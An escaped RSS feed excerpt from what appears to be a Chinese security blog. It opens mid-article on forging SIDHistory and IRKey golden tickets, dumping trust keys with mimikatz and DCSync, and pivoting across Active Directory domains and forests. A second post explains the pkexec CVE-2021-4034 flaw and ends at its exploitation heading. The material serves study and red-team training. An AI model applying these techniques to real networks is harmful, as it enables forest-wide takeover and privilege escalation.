&lt;p&gt;仍然在lab.adsec. com域中构造黄金票据,但添加了SIDS参数，&lt;strong&gt;使用根域的企业管理员SID作为参数值&lt;/strong&gt;，即SIDHistory版黄金票据，对lab.adsec.com和adsec.com域均有效。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注意：&lt;/p&gt;
&lt;p&gt;实现SIDHistory版黄金票据的基础是&lt;strong&gt;森林内信任关系&lt;/strong&gt;，因为如果不是森林内信任关系，则SIDHistory会被微软的SID Filter规则过滤掉,从而失效，但森林内部不会有SID Filter规则。这也是为什么说&lt;strong&gt;森林是安全边界&lt;/strong&gt;而非域。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;irkey-版跨域黄金票据&#34;&gt;IRKey 版跨域黄金票据&lt;/h2&gt;
&lt;p&gt;当2个域之间建立域信任关系时，需要建立共享的域间密钥（Inter-Realm Key，简写为IRKey），其作用相当于Krbtgt，只不过IRKey是用于相互信任的2个域之间，而Krbtgt用于同一个域服务器的AC和KDC之间。&lt;/p&gt;
&lt;p&gt;只要获取森林内部任意域的krbtgt账号的NTLM值，则通过SIDHistory版黄金票据，即可获取全森林所有域的控制权。因此&lt;strong&gt;为了防御，必须2次修改森林内部所有域的krbtgt账号的NTLM值&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;在多域环境中，IRKey和主机账号类似，系统默认每30天自动修改一次NTLM。所以即使2次修改森林内所有域的krbtgt账号的NTLM，IRKey的NTLM大概率仍然没有发生 改变（小概率是krbtgt的NTLM修改正好碰上了IRKey的修改周期）。&lt;/p&gt;
&lt;p&gt;可以使用&lt;strong&gt;IRKey伪造域间可转投票据(Inter-Realm Referral TGT),获取目标域的域管理员权限&lt;/strong&gt;，然后再结合SIDHistory版黄金票据，再次获取整个森林的控制权。&lt;strong&gt;需要注意的是SID为目标域的SID。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在域中，大部分带&lt;code&gt;$&lt;/code&gt;符号的账号为Computer账号，但是&lt;strong&gt;User组带&lt;code&gt;$&lt;/code&gt;符号的账号为信任账号&lt;/strong&gt;，可以通过域服务器自带的Powershe11命令&lt;code&gt;Get-ADUser&lt;/code&gt;获取所有带&lt;code&gt;$&lt;/code&gt;符号的User账号，例如下图中的&lt;code&gt;ADSECS$&lt;/code&gt;账号为信任账号，隶属
于Users组：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 331; 
			flex-basis: 794px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306202433733.png&#34; data-size=&#34;1752x529&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306202433733.png&#34;
			width=&#34;1752&#34;
			height=&#34;529&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306202433733_hu979cd0bfbece141ae65c77a8f56dce4a_548513_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-14/image-20220306202433733_hu979cd0bfbece141ae65c77a8f56dce4a_548513_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Dcsync 获取信任账号NTLM&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 148; 
			flex-basis: 356px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306202850685.png&#34; data-size=&#34;1414x953&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306202850685.png&#34;
			width=&#34;1414&#34;
			height=&#34;953&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306202850685_hu85fb91c2cd470f4c842810420e52e3d3_999638_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-14/image-20220306202850685_hu85fb91c2cd470f4c842810420e52e3d3_999638_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;lsadump::trust /patch&lt;/code&gt;获取信任账号NTLM&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 198; 
			flex-basis: 475px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306203603888.png&#34; data-size=&#34;1689x852&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306203603888.png&#34;
			width=&#34;1689&#34;
			height=&#34;852&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306203603888_hued6743490a9274ab30372a1044e387ee_1601436_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-14/image-20220306203603888_hued6743490a9274ab30372a1044e387ee_1601436_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;从图中可看到有&lt;code&gt;[IN]LAB.ADSEC.COM-&amp;gt;ADSEC.COM&lt;/code&gt;和&lt;code&gt;[OUT]ADSEC.COM-&amp;gt;LAB.ADSEC.COM&lt;/code&gt;两种不同的NTLM值，分别是往外到其他域和往内到本域访问时用到的值。&lt;strong&gt;因为双向信任关系其实是2个单向信任关系的叠加&lt;/strong&gt;，所以会有2个密钥。为了从本域&lt;code&gt;lab.adsec.com&lt;/code&gt;构造IRKey版黄金票据并访问森林内部其他域，所以使用IN这个NTLM值。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;由于IRKey存在于森林内部的信任域之间，也存在于森林外部的森林之间，均可用于转投认证。在SIDHistoy版黄金票据中，由于SID Filter规则，在森林之间不能使用，但是IRKey版不涉及这个安全过滤规则，仍然有效。IRKey版黄金票据可以分作&lt;strong&gt;森林内部、森林外部2种&lt;/strong&gt;，操作方法类似。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;mimikatz生成IRkey版跨域黄金票据&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 130; 
			flex-basis: 312px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306204106301.png&#34; data-size=&#34;1313x1008&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306204106301.png&#34;
			width=&#34;1313&#34;
			height=&#34;1008&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306204106301_huc521a3e04a434702843d0912980f4e60_872805_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-14/image-20220306204106301_huc521a3e04a434702843d0912980f4e60_872805_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;虽然参数还是krbtgt，但是值已经是IRKey账户的NTLM&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;域间转投票据的认证，依靠IRKey加密。在已知IRKey的前提下，可以伪造持有该IRKey的信任域的任意用户。上图测试中，我们构造一个票据，告诉adsec.com域，转投认证的用户为administrator,而且SIDHistory为根域的企业管理员。&lt;/p&gt;
&lt;p&gt;构造成功后，具备adsec.com的管理员权限，但是不能高权限访问lab.adsec.com，&lt;strong&gt;因为构造的票据是到adsec.com域的管理员票据&lt;/strong&gt;。在获取adsec.com域的高权限后，&lt;strong&gt;可以获取该域的krbtgt账号的NTLM值，在此基础上，继续构造SIDHistory版黄金票据&lt;/strong&gt;，从而可以获取整个森林的控制权。&lt;/p&gt;
&lt;h2 id=&#34;域信任关系的获取&#34;&gt;域信任关系的获取&lt;/h2&gt;
&lt;p&gt;在大型域网络中，因为公司并购、企业重组、业务扩展等各种原因，域网络的组织模式、信任关系各有不同。这些不同的信任关系，均存放在森林根域的数据库中(Global Catalog)，有多种方式可以获取这些数据。&lt;/p&gt;
&lt;h3 id=&#34;powersploit&#34;&gt;PowerSploit&lt;/h3&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 195; 
			flex-basis: 470px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306213910574.png&#34; data-size=&#34;1714x875&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306213910574.png&#34;
			width=&#34;1714&#34;
			height=&#34;875&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306213910574_hub14a8fbb126aea14b20b007d565169bf_977104_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-14/image-20220306213910574_hub14a8fbb126aea14b20b007d565169bf_977104_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Get-NetForestTrust&lt;/code&gt;获取指定域的森林间信任关系。&lt;code&gt;Get-NetDomainTrust&lt;/code&gt;获取指定域所在森林内部所有信任关系。一般，只要指定域信任当前主机所在的域，就可以获取对方的信任关系数据。&lt;/p&gt;
&lt;p&gt;在查询时可以使用Export-CSV -NoTypeInformation将输出结果转换为CSV格式，命令为&lt;code&gt;Get-DomainTrustMapping -API Export-CSV -NoTypeInformation trusts-mapping.csv&lt;/code&gt;。然后使用&lt;code&gt;TrustVisualizer&lt;/code&gt;工具进行可视化输出。最后使用&lt;code&gt;yED&lt;/code&gt;工具转换为可视化图形。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 585; 
			flex-basis: 1404px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306215525679.png&#34; data-size=&#34;1703x291&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306215525679.png&#34;
			width=&#34;1703&#34;
			height=&#34;291&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306215525679_hu90254bd223906bc1110583ee9115c4f9_354552_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-14/image-20220306215525679_hu90254bd223906bc1110583ee9115c4f9_354552_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 180; 
			flex-basis: 434px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306215555051.png&#34; data-size=&#34;700x387&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306215555051.png&#34;
			width=&#34;700&#34;
			height=&#34;387&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306215555051_hu7eba03d70e2645003b8994e33bcbddb7_69906_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-14/image-20220306215555051_hu7eba03d70e2645003b8994e33bcbddb7_69906_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;bloodhound&#34;&gt;BloodHound&lt;/h3&gt;
&lt;h2 id=&#34;利用域信任实现跨域攻击&#34;&gt;利用域信任实现跨域攻击&lt;/h2&gt;
&lt;p&gt;如果一个域内用户(假设用户为 eviluser)想访问其他域的资源访问，首先&lt;strong&gt;确保目标域信任当前用户所在的域&lt;/strong&gt;，这是基本前提，然后必须具备以下3个条件之一：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;eviluser 被目标域加入了某个组，这个组在目标域中具有资源访问权限&lt;/li&gt;
&lt;li&gt;eviluser 被目标域中的某些主机或服务器添加为本地组，例如被某台服务器添加为本地管理员组&lt;/li&gt;
&lt;li&gt;当前用户被目标域的某些域对象添加为访问控制 ACL 的安全主体(Security Principal)，例如可以修改某个域用户对象的口令&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;根据前面内容，只要获取了当前域的 &lt;code&gt;Krbtgt&lt;/code&gt; 账号或者 &lt;code&gt;IRKey&lt;/code&gt; 账号的 &lt;code&gt;NTLM&lt;/code&gt; 值， 即可获取整个森林的控制权。然而实际情况下并不一定能顺利获取某个域的 &lt;code&gt;Krbtgt&lt;/code&gt; 账号或者 &lt;code&gt;IRKey&lt;/code&gt; 账号的 &lt;code&gt;NTLM&lt;/code&gt; 值，例如域资源少、配置严谨、系统更新及时等，这时需要绕道至更大的域，才有更多的机会获取 &lt;code&gt;Krbtgt&lt;/code&gt; 账号或者 &lt;code&gt;IRKey&lt;/code&gt; 账号的 &lt;code&gt;NTLM&lt;/code&gt; 值，因为资源越多，存在脆弱点的概率越大。&lt;/p&gt;
&lt;p&gt;要实现从当前用户 eviluser 开始，跨域攻击 A 域，&lt;strong&gt;首先得确保当前用户具备跨域访问 A 域资源的权限&lt;/strong&gt;，所以攻击环节应该包括几个步骤：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;从当前域的数据库中，枚举有哪些域信任当前域 (出)，由于是攻击其他域，所以不用关注当前域信任哪些外部域(入)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;利用信任关系，枚举目标域中哪些组包含外来域的用户。在域内通常有 3 种 类型的组：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第 1 种是域本地组(Domain Local Groups)，可以添加跨域、跨森林的组成员，也是最常见的组&lt;/li&gt;
&lt;li&gt;第 2 种是全局组(Global Groups)，不允许有任何跨域组成员，即使是同一个森林也不可以&lt;/li&gt;
&lt;li&gt;第 3 种是通用组(Universal Groups)，可以添加森林内的任何成员，但是跨森林的不可以&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一般只关注第1和第3种组，一个用户的 &lt;code&gt;memberof&lt;/code&gt; 属性由组的 &lt;code&gt;member&lt;/code&gt; 属性计算 而来，前提是组的 &lt;code&gt;member&lt;/code&gt; 属性已经更新到全局目录数据库中(Global Catalog)。如果一个用户被森林中另外一个域添加为通用组成员，通用组将 &lt;code&gt;member&lt;/code&gt; 属性更新到森林的全局目录数据库中，用户的 &lt;code&gt;memberof&lt;/code&gt; 属性会通过计算被更新。&lt;/p&gt;
&lt;p&gt;一个用户被森林中另外一个域添加为域本地组成员时，由于域本地组不会更新 &lt;code&gt;memberof&lt;/code&gt; 属性到全局目录数据库中，因此用户的 &lt;code&gt;memberof&lt;/code&gt; 属性也不会被计算更新。所以，即使我们有权限查询森林的全局目录数据库，也只能得到被添加到其他域通用组的成员属性，要想获得加入其他域域本地组的成员属性，需要逐个轮询所有的域。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;枚举目标域中主机\服务器的本地组，查看哪些外来用户被加入到主机\服务器的本地组，可以通过 &lt;code&gt;GPO&lt;/code&gt; 组策略进行枚举，也可以通过 &lt;code&gt;PowerView&lt;/code&gt; 逐个探测，或使用 &lt;code&gt;BloodHood&lt;/code&gt; 自动化全部探测&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;枚举目标域内对象的 ACL，检查是否有包含外来域用户的域对象 ACL。一般而言，任意用户均可查看所有域内对象的 ACL，同时全局数据库中保存了所有域对象的 ACL，可以很方便进行枚举。PowerView 提供了 &lt;code&gt;Get-DomainObjectACL&lt;/code&gt; 命令去获取这项信息。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 241; 
			flex-basis: 579px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-14/image-20220310145211211.png&#34; data-size=&#34;1033x428&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-14/image-20220310145211211.png&#34;
			width=&#34;1033&#34;
			height=&#34;428&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-14/image-20220310145211211_hufb6dd7d1af373b85dbedf0edd18c1b7a_300869_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-14/image-20220310145211211_hufb6dd7d1af373b85dbedf0edd18c1b7a_300869_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;对前面几步筛选出的用户做第二次筛选，筛选出属于当前域的用户，作为在当前域中的攻击对象，例如获取目标用户的 NTLM 值或者 TGT 票据等。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;利用获取的用户的NTLM值或者TGT票据进行跨域，进入目标域，然后攻击获取目标域的 &lt;code&gt;Krbtgt&lt;/code&gt; 账号或者 &lt;code&gt;IRKey&lt;/code&gt; 账号的 &lt;code&gt;NTLM&lt;/code&gt; 值，如果条件不成熟，继续上面的步骤，逐步进入更多的域中寻找机会。&lt;/p&gt;
&lt;p&gt;当一个用户被森林外部域加入某个组时，会出现在外部目标域的 &lt;code&gt;CN=ForeignSecurityPrincipals,DC=domain,DC=com&lt;/code&gt; 组中，相当于用户在外部域中的代表或者别名，而且域中的所有外来用户具备相同的 &lt;code&gt;SID&lt;/code&gt;，这是跨森林的 &lt;code&gt;SID&lt;/code&gt; 过滤安全机制的效果。&lt;/p&gt;
&lt;p&gt;所以只要枚举 &lt;code&gt;ForeignSecurityPrincipals&lt;/code&gt; 组，就可得知哪些用户具有这个外部森林的访问权限，假设用户结果集合为 &lt;code&gt;ExternalUsers&lt;/code&gt;。接下来，先查看是否包含我们当前所在域的用户，如果有，则直接攻击这些用户获取 &lt;code&gt;NTLM&lt;/code&gt; 值或者 &lt;code&gt;TGT&lt;/code&gt; 票据，从而获取森林外部域的资源访问权限。&lt;/p&gt;
&lt;p&gt;如果没有，则查看 &lt;code&gt;ExternalUsers&lt;/code&gt; 是否包含我们当前所在森林的用户，假设结果合集为 &lt;code&gt;InternalUsers&lt;/code&gt;。在当前森林中查询定位 &lt;code&gt;InternalUsers&lt;/code&gt; 所在的域。以这些域为目标，使用森林内部的跨域攻击方法，攻击这些域，获取进入这些域的权限，再从这些域中攻击 &lt;code&gt;InternalUsers&lt;/code&gt; 中的用户，从而获取外部域的资源访问权限。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;sid过滤机制&#34;&gt;SID过滤机制&lt;/h2&gt;
&lt;h3 id=&#34;sidhistory&#34;&gt;SIDHistory&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;SIDHistory&lt;/code&gt;属性的存在是为了解决用户在迁移到另一个域中的时候权限会改变的问题。例如用户a在A域中本来是管理员，迁移到B域的时候因为&lt;code&gt;SID&lt;/code&gt;的改变有可能会变成普通用户权限，这时候如果给a用户添加一个值为a在A域中的&lt;code&gt;SID&lt;/code&gt;的&lt;code&gt;SIDHistory&lt;/code&gt;值，就可以解决这个问题，&lt;strong&gt;只有域管有更改&lt;code&gt;SIDHistory&lt;/code&gt;的权力。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当一个用户迁移到新的域后，原来的 &lt;code&gt;SID&lt;/code&gt; 以及所在组的一些 &lt;code&gt;SID&lt;/code&gt;，都可被加入到新域中新用户的 &lt;code&gt;SIDHistory&lt;/code&gt; 属性。当这个新的用户访问某个资源时，根据 &lt;code&gt;SID&lt;/code&gt; 或者 &lt;code&gt;SIDHistory&lt;/code&gt; 在资源 &lt;code&gt;ACL&lt;/code&gt; 中的匹配性来判断是拒绝或者允许访问。因此 &lt;code&gt;SIDHistory&lt;/code&gt; 相当于多了一个或者多个组属性，最终权限得到了扩张。&lt;/p&gt;
&lt;h3 id=&#34;sid-过滤&#34;&gt;SID 过滤&lt;/h3&gt;
&lt;p&gt;当一个用户的 &lt;code&gt;TGT&lt;/code&gt; 通过域信任关系被转递到一个新域后，&lt;code&gt;TGT&lt;/code&gt; 中的 &lt;code&gt;PAC(privileged attribute certificate)&lt;/code&gt; 包含用户的 &lt;code&gt;SID&lt;/code&gt; 和 &lt;code&gt;SIDHistory&lt;/code&gt;。新域对 &lt;code&gt;PAC&lt;/code&gt; 进行严格的审查 ，并根据信任关系的类别执行各种安全过滤机制&lt;/p&gt;
&lt;p&gt;有些 &lt;code&gt;SID&lt;/code&gt; 是一直被拒绝的，例如企业管理员 &lt;code&gt;(S-1-5-21-&amp;lt;Domain&amp;gt;-519)&lt;/code&gt; 的 &lt;code&gt;SID&lt;/code&gt; 是被 &lt;code&gt;ForestSpecific&lt;/code&gt; 规则过滤，因为森林拒绝来自森林之外的特权 &lt;code&gt;SIDHistory&lt;/code&gt;。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>pkexec 本地提权</title>
        <link>https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/</link>
        <pubDate>Sat, 01 Jan 2022 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post pkexec 本地提权" /&gt;&lt;h1 id=&#34;pkexec-本地提权&#34;&gt;pkexec 本地提权&lt;/h1&gt;
&lt;p&gt;CVE-2021-4034&lt;/p&gt;
&lt;h2 id=&#34;简介&#34;&gt;简介&lt;/h2&gt;
&lt;p&gt;Polkit是一个用于控制类Unix系统中控制系统范围权限的组件，它为非特权进程与特权进程的通信提供了一种有组织的方式。&lt;/p&gt;
&lt;p&gt;pkexec是Polkit开源应用框架的一部分，它负责协商特权进程和非特权进程之间的互动，允许授权用户以另一个用户的身份执行命令，和 sudo 等程序不同，Polkit 并没有赋予进程完全的 root 权限，而是通过一个集中的策略系统进行更精细的授权。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;pkexec是一个suid文件：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 1413; 
			flex-basis: 3391px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/image-20220223160034367.png&#34; data-size=&#34;537x38&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/image-20220223160034367.png&#34;
			width=&#34;537&#34;
			height=&#34;38&#34;
			srcset=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/image-20220223160034367_hue5d085dd5e157f9aad50184576a4d63f_10997_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/image-20220223160034367_hue5d085dd5e157f9aad50184576a4d63f_10997_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;pkexec执行&lt;code&gt;whoami&lt;/code&gt;：&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 374; 
			flex-basis: 899px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/image-20220223160402003.png&#34; data-size=&#34;1031x275&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/image-20220223160402003.png&#34;
			width=&#34;1031&#34;
			height=&#34;275&#34;
			srcset=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/image-20220223160402003_huf588e00e46ec3eb998be7109db3f2fbd_57086_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/image-20220223160402003_huf588e00e46ec3eb998be7109db3f2fbd_57086_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;输入root认证密码后：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 1117; 
			flex-basis: 2681px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/image-20220223160436706.png&#34; data-size=&#34;391x35&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/image-20220223160436706.png&#34;
			width=&#34;391&#34;
			height=&#34;35&#34;
			srcset=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/image-20220223160436706_hud20c645fb419d71ed9aa50504addc7fd_5784_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/image-20220223160436706_hud20c645fb419d71ed9aa50504addc7fd_5784_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞信息&#34;&gt;漏洞信息&lt;/h2&gt;
&lt;p&gt;当前版本的 pkexec 无法正确处理调用参数计数，并最终尝试将环境变量作为命令执行。攻击者可以通过控制环境变量来利用这一点，从而诱导 pkexec 执行任意代码。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;影响范围：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;影响2009年 - 今的版本(当前0.105)&lt;/p&gt;
&lt;h2 id=&#34;复现环境&#34;&gt;复现环境&lt;/h2&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 1116; 
			flex-basis: 2680px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/image-20220223160634660.png&#34; data-size=&#34;994x89&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/image-20220223160634660.png&#34;
			width=&#34;994&#34;
			height=&#34;89&#34;
			srcset=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/image-20220223160634660_hue34018282c332b5fce078a0c3e591e6b_23152_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/image-20220223160634660_hue34018282c332b5fce078a0c3e591e6b_23152_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞原理&#34;&gt;漏洞原理&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int
main (int argc, char *argv[])
{
    
  ··· ···
  ··· ···
      
 // 从1开始
  for (n = 1; n &amp;lt; (guint) argc; n++) 
    {
      if (strcmp (argv[n], &amp;quot;--help&amp;quot;) == 0)
        {
          opt_show_help = TRUE;
        }
      else
        {
          break;
        }
    }

  ··· ···

  g_assert (argv[argc] == NULL);
  path = g_strdup (argv[n]); //获取要执行的命令
  if (path == NULL)
    {
      ···
    }
  if (path[0] != &#39;/&#39;)
    {
      // 该函数根据PATH环境变量寻找要执行命令的绝对路径
      s = g_find_program_in_path (path); 
      if (s == NULL)
        {
          ···
        }
      g_free (path);
      argv[n] = path = s;//获取到地址后，修改命令行参数
    }
  ··· ···
  ··· ···

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;大致是这样的流程：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;从&lt;code&gt;1&lt;/code&gt;开始获取参数值，表明默认在pkexec后会跟着一个要执行的命令，例如&lt;code&gt;pkexec whoami&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;匹配到命令后传入&lt;code&gt;g_find_program_in_path&lt;/code&gt;函数，该函数负责根据PATH环境变量寻找要执行命令的绝对路径，例如&lt;code&gt;/usr/bin/whoami&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;最后写回命令行参数，就可以执行&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Linux二进制程序运行时会将命令行参数&lt;code&gt;argv[]&lt;/code&gt;和环境变量&lt;code&gt;environ[]&lt;/code&gt;放到栈底部，并且&lt;code&gt;argv[]&lt;/code&gt; 和 &lt;code&gt;environ[]&lt;/code&gt; 是连续的。&lt;/p&gt;
&lt;p&gt;当以命令行启动pkexec，arg[0]=&amp;lsquo;pkexec&amp;rsquo;，arg[1]=&#39;\x00&#39;，运行正常。但是当以execve函数启动的pkexec ，不带任何其他参数，那么argv[0] 为&#39;&#39;\x00&#39;，&lt;code&gt;argv[1]&lt;/code&gt; 环境变量就会&lt;strong&gt;越界&lt;/strong&gt;到 environ[0]。&lt;/p&gt;
&lt;p&gt;那么利用思路就是以execve函数启动pkexec，且不带参数，并伪造环境变量。&lt;/p&gt;
&lt;h2 id=&#34;漏洞利用&#34;&gt;漏洞利用&lt;/h2&gt;
